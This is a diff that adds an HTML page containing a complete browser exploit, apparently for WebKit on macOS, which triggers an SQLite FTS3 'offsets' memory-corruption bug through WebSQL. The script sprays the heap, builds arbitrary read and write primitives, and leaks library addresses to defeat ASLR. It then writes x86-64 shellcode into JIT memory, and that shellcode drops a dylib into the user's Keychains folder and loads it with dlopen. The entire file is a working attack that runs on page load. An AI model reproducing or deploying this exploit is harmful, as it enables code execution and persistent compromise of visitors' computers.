@@ -1,0 +1,300 @@
+<!DOCTYPE HTML>
+<html>
+<body>
+<script type="text/javascript">
+
+function gc() {
+    try {
+        var c = document.createElement("canvas");
+        var gl = c.getContext("2d");
+
+        for (var i = 0; i < 1000; i++) {
+            var gggg = gl.createImageData(1, 0x100000/4)
+        }
+    } catch (e) {
+
+    }
+}
+
+var shellcode = [ 0x48, 0x8D, 0x3D, 0x00, 0x01, 0x00, 0x00, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xFE, 0x48, 0x81, 0xEC, 0x38, 0x01, 0x00, 0x00, 0x48, 0x89, 0xE7, 0x49, 0x8D, 0x76, 0x30, 0x48, 0x31, 0xC9, 0x8A, 0x04, 0x0E, 0x88, 0x04, 0x0F, 0x48, 0xFF, 0xC1, 0x3C, 0x00, 0x75, 0xF3, 0x48, 0x83, 0xE9, 0x01, 0x48, 0x01, 0xCF, 0x48, 0xC7, 0xC6, 0x00, 0x01, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x31, 0x00, 0x00, 0x02, 0x0F, 0x05, 0x48, 0x31, 0xC9, 0x8A, 0x04, 0x0F, 0x48, 0xFF, 0xC1, 0x3C, 0x00, 0x75, 0xF6, 0x48, 0x83, 0xE9, 0x01, 0x48, 0x01, 0xCF, 0x49, 0x8D, 0x76, 0x48, 0x48, 0x31, 0xC9, 0x8A, 0x04, 0x0E, 0x88, 0x04, 0x0F, 0x48, 0xFF, 0xC1, 0x3C, 0x00, 0x75, 0xF3, 0x48, 0x89, 0xE7, 0x48, 0xC7, 0xC6, 0x02, 0x06, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0xA4, 0x01, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x02, 0x0F, 0x05, 0x49, 0x89, 0xC7, 0x48, 0x89, 0xC7, 0x49, 0x8B, 0x36, 0x49, 0x8B, 0x56, 0x08, 0x48, 0xC7, 0xC0, 0x04, 0x00, 0x00, 0x02, 0x0F, 0x05, 0x4C, 0x89, 0xFF, 0x48, 0xC7, 0xC0, 0x06, 0x00, 0x00, 0x02, 0x0F, 0x05, 0x48, 0x89, 0xE7, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x46, 0x10, 0x48, 0x81, 0xC4, 0x38, 0x01, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x48, 0x81, 0xEC, 0x48, 0x01, 0x00, 0x00, 0xFF, 0xD0 ];
+
+var shelldata = [ 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x2f, 0x55, 0x73, 0x65, 0x72, 0x73, 0x2f, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+                  0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x4b, 0x65, 0x79, 0x63, 0x68, 0x61, 0x69, 0x6e, 0x73, 0x2f, 0x6c, 0x69, 0x62, 0x74, 0x6d, 0x70, 0x2e, 0x64, 0x79, 0x6c, 0x69, 0x62, 0x0
+                ];
+
+var structs = [];
+var butterfly_fixed_low_32_bit = 0x74567000;
+var butterfly_fixed_high_32_bit = 0x1;
+
+var ab_fixed_low_32_bit = 0xb4567010;
+var ab_fixed_high_32_bit = 0x2;
+
+// `vtable for'WTF::Function<void ()(void *)>::CallableWrapper<JSC::ArrayBufferContents::tryAllocate
+var jsc_1 = 0x0000000000CE51B8;
+// _dyld_image_count_ptr
+var jsc_2 = 0x0000000000CE4960;
+
+// _dyld_image_count
+var jsc_3 = 0x0000000000001AAE;
+// _dlopen
+var jsc_4 = 0x0000000000002761;
+
+var addr = 0;
+var rw_abv = 0;
+var control_abv = 0;
+var addrof_index = 0;
+var addrof_obj = 0;
+
+var spray_high_high = new Array(0x1000);
+var spray_arraybuffer_high = new Array(0x80000);
+
+function read32(addr){
+  control_abv[0xc10/4] = addr % 0x100000000;
+  control_abv[0xc10/4 + 1] = (addr - addr % 0x100000000)/0x100000000;
+  return rw_abv[0];
+}
+
+function write8(addr, value){
+  control_abv[0xc10/4] = addr % 0x100000000;
+  control_abv[0xc10/4 + 1] = (addr - addr % 0x100000000)/0x100000000;
+  rw_abv[0] = value;
+}
+
+function write32(addr, value){
+  control_abv[0xc10/4] = addr % 0x100000000;
+  control_abv[0xc10/4 + 1] = (addr - addr % 0x100000000)/0x100000000;
+  rw_abv[0] = value;
+}
+
+function read64(addr){
+  var lo = read32(addr);
+  var hi = read32(addr+0x4);
+  return hi * 0x100000000 + lo;
+}
+
+function addrOf(o){
+  addrof_obj[addrof_index] = o;
+  return read64(butterfly_fixed_high_32_bit * 0x100000000 + butterfly_fixed_low_32_bit + 0x10);
+}
+
+function sprayStructures() {
+    function randomString() {
+        return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
+    }
+    for (var i = 0; i < 0x1000; i++) {
+        var a = new Uint32Array(new ArrayBuffer(10),0,2);
+        a[randomString()] = 1337;
+        structs.push(a);
+    }
+}
+
+var arr_0 = [];
+function spray_to_high(){
+
+  gc();gc();
+
+  var spray_high = new Array(0x10000);
+  for(var i=0;i<spray_high.length;++i){
+    spray_high[i] = 0;
+  }
+  for(var i=1;i<spray_high_high.length;++i){
+    spray_high_high[i] = Array.from(spray_high);
+  }
+  spray_high_high[0] = spray_high;
+  for(var i=0;i<spray_arraybuffer_high.length;++i){
+
+    var abv = new Uint32Array(900);
+
+    abv[0] = ab_fixed_low_32_bit+0x800;
+    abv[1] = ab_fixed_high_32_bit;
+
+    abv[0x850/4] = 1;
+
+    // pCsr + 0x10 pStmt
+    // pStmt @ + 0x200
+    abv[0x10/4] = ab_fixed_low_32_bit+0x200;
+    abv[0x10/4 + 1] = ab_fixed_high_32_bit;
+
+    abv[0x8/4] = 0x1000000;
+
+    abv[0x30/4] = ab_fixed_low_32_bit+0xc00;
+    abv[0x30/4 + 1] = ab_fixed_high_32_bit;
+
+    // pStmt + 0x0 db
+    // db @ + 0x400
+    abv[0x200/4] = ab_fixed_low_32_bit+0x400;
+    abv[0x200/4 + 1] = ab_fixed_high_32_bit;
+
+    // pStmt + 0x44 magic
+    abv[0x244/4] = 0xbdf20da3;
+
+    // pStmt + 0x68 aVar
+    // aVar @ + 
+    abv[0x268/4] = butterfly_fixed_low_32_bit;
+    abv[0x268/4 + 1] = butterfly_fixed_high_32_bit;
+
+    // pStmt + 0x78 nVar
+    abv[0x278/4] = 0x1;
+
+    // pStmt + 0x84 pc
+    abv[0x284/4] = -1;
+
+    abv[0x290/4] = 8;
+
+    // fake Uint32Array @ + 0xc00
+    abv[0xc00/4] = 0x1000;
+    abv[0xc00/4 + 1] = 0x01182800;//0x01602300;
+    abv[0xc08/4] = 0;
+    abv[0xc08/4 + 1] = 0;
+    abv[0xc10/4] = ab_fixed_low_32_bit;
+    abv[0xc10/4 + 1] = ab_fixed_high_32_bit;
+    abv[0xc18/4] = 0x1000;
+
+    spray_arraybuffer_high[i] = abv;
+  }
+}
+
+function generateFunc()
+{   
+    var body = ''
+    for (var k = 0; k < 0x600; k++) {
+        body += 'try {} catch(e) {};';
+    }
+    body += 'return 0x1337;';
+    return new Function('a', body);
+}
+
+function getJITXAddr(fn)
+{
+    for (var i = 0; i < 0x100000; i++) {
+        fn();
+    }
+    var jsFunc = addrOf(fn);
+    var executable = read64(jsFunc+0x18);
+    var X_addr = read64(executable+0x28);
+    return X_addr;
+}
+
+function find_rw() {  
+  for(var i=0;i<spray_high_high.length;++i){
+    var tmp = spray_high_high[i];
+    for(var j=0;j<tmp.length;++j){
+      if(tmp[j] == 4){
+        tmp[j+1] = new Uint32Array(10);
+        tmp.push('aaaa');
+        rw_abv = tmp[j-1];
+        addrof_index = j+1;
+        addrof_obj = tmp;
+        break;
+      }
+    }
+    if(rw_abv) break;
+  }
+  if (rw_abv == 0) {
+    return;
+  }
+
+  while(!(rw_abv instanceof Uint32Array)){
+    for(var i=0;i<spray_arraybuffer_high.length;++i){
+      var tmp_abv = spray_arraybuffer_high[i];
+      tmp_abv[0xc00/4] += 1;
+    }
+  }
+
+  rw_abv[0x20/4] = 0x13333331;
+  for(var i=0;i<spray_arraybuffer_high.length;++i){
+    var tmp_abv = spray_arraybuffer_high[i];
+    for(var pos=0;pos<tmp_abv.byteLength/4;++pos){
+      if(tmp_abv[pos] == 0x13333331){
+        
+        control_abv = tmp_abv;
+        control_abv[pos] = 0x19999991;
+        return;
+      }
+    }
+  }
+}
+
+function run(){
+  var tmpab = new ArrayBuffer(0x100);
+  var ab_addr = addrOf(tmpab);
+  var arraybuffer = read64(ab_addr+0x10);
+  var destructor = read64(arraybuffer+0x10);
+  var jsc_slide = read64(destructor) - jsc_1;
+  var dladdr_stub = jsc_slide+jsc_2;
+  var dyld_slide = read64(dladdr_stub) - jsc_3;
+  var dlopen = dyld_slide + jsc_4;
+
+  var f = generateFunc();
+  var x_addr = getJITXAddr(f);
+  var ab = new Uint8Array(s);
+  var s_addr = addrOf(ab.buffer);
+  var s_addr = read64(s_addr+0x10);
+  var s_addr = read64(s_addr+0x20);
+  var s_length = ab.byteLength;
+  var dv = new DataView(new Uint8Array(shelldata).buffer);
+  dv.setUint32(0x0,s_addr % 0x100000000);
+  dv.setUint32(0x4,(s_addr - s_addr % 0x100000000)/0x100000000);
+  dv.setUint32(0x8,s_length);
+
+  dv.setUint32(0x10,dlopen % 0x100000000);
+  dv.setUint32(0x14,(dlopen - dlopen % 0x100000000)/0x100000000);  
+  // copy shellcode
+  // shellcode[0] = 0xcc;
+  var pos = x_addr;
+  for(var i=0;i<shellcode.length;++i){
+    write8(pos,shellcode[i]);
+    pos++;
+  }
+  while(pos % 8 != 0){
+    write8(pos,0x90);
+    pos++;
+  }
+  var offset = pos - x_addr - 0x7;
+  write32(x_addr+0x3,offset);
+  for(var i=0;i<0x30;i+=4){
+    write32(pos,dv.getUint32(i));
+    pos+=4;
+  }
+  for(var i=0x30;i<dv.byteLength;i++){
+    write8(pos,dv.getUint8(i));
+    pos++;
+  }
+
+  f();
+}
+
+var db = openDatabase('testdb', '1.0', 'Test', 1024 * 1024);
+
+function exp() {
+    spray_to_high();
+
+    db.transaction(function (tx) {
+        tx.executeSql('drop table if exists a;')
+        tx.executeSql('create virtual table a using fts3(b);');
+        tx.executeSql("insert into a values (x'107056b402000000');");
+
+        tx.executeSql('select offsets(b) from a;', [], function (tx, results) {
+          find_rw();
+          run();
+        }, 
+        function (tx, error) {
+          alert('select err '+error.message);
+        });
+    });
+}
+
+sprayStructures();
+exp();
+
+</script>
+</body>
+</html>
